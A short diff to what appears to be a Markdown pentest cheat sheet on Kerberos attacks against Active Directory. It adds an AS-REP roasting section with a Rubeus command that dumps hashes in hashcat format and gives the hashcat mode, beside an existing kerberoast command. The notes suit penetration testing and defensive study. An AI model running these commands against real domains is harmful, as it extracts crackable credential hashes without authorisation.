@@ -50,3 +50,9 @@ A ticket is prefixed with `$krb5tgs$23$*`, where `23` is `RC4` (type 23):
 ```PowerShell
 .\Rubeus.exe kerberoast /tgtdeleg /user:[user] /nowrap
 ```
+
+### ASREPRoasting
+```PowerShell
+.\Rubeus.exe asreproast /user:[user] /nowrap /format:hashcat
+```
+> Hashcat mode : 18200
